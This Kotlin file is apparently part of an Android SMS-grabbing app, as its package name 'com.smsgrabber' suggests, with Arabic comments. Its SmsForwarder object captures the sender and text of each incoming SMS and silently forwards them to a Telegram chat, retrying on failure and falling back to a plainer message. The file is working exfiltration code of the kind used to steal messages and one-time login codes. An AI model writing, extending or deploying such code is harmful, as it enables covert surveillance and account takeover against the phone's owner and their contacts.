package com.smsgrabber

import android.content.Context
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * معالج الرسائل النصية
 * تنسيق وإرسال الرسائل للتيليجرام مع آلية إعادة المحاولة
 */
object SmsForwarder {

    private const val MAX_RETRIES = 3
    private const val RETRY_DELAY_MS = 2000L

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    /**
     * معالجة الرسالة الواردة
     */
    fun process(context: Context, sender: String, body: String, timestamp: Long) {
        Thread {
            val formattedMessage = formatMessage(sender, body, timestamp)
            sendWithRetry(formattedMessage, sender, body, timestamp)
        }.start()
    }

    /**
     * تنسيق الرسالة بشكل جميل للتيليجرام
     */
    private fun formatMessage(sender: String, body: String, timestamp: Long): String {
        val date = Date(timestamp)

        return buildString {
            appendLine("━━━━━━━━━━━━━━━━")
            appendLine("📩 *رسالة جديدة*")
            appendLine("━━━━━━━━━━━━━━━━")
            appendLine("📞 *المرسل:* `$sender`")
            appendLine("🕐 *الوقت:* ${dateFormat.format(date)}")
            appendLine("")
            appendLine("📝 *المحتوى:*")
            appendLine("`$body`")
            appendLine("━━━━━━━━━━━━━━━━")
        }
    }

    /**
     * آلية إعادة المحاولة عند فشل الإرسال
     */
    private fun sendWithRetry(
        formattedMessage: String,
        sender: String,
        body: String,
        timestamp: Long
    ) {
        for (attempt in 1..MAX_RETRIES) {
            try {
                val success = TelegramApi.sendMessage(formattedMessage)
                if (success) return

                // فشل - انتظر وأعد المحاولة
                if (attempt < MAX_RETRIES) {
                    Thread.sleep(RETRY_DELAY_MS * attempt)
                }
            } catch (e: Exception) {
                // محاولة إرسال بنمط أبسط عند الفشل المتكرر
                if (attempt == MAX_RETRIES) {
                    try {
                        val simpleMessage = "📩 SMS\nمن: $sender\n$body"
                        TelegramApi.sendMessage(simpleMessage)
                    } catch (_: Exception) {}
                } else {
                    try {
                        Thread.sleep(RETRY_DELAY_MS * attempt)
                    } catch (_: Exception) {}
                }
            }
        }
    }
}
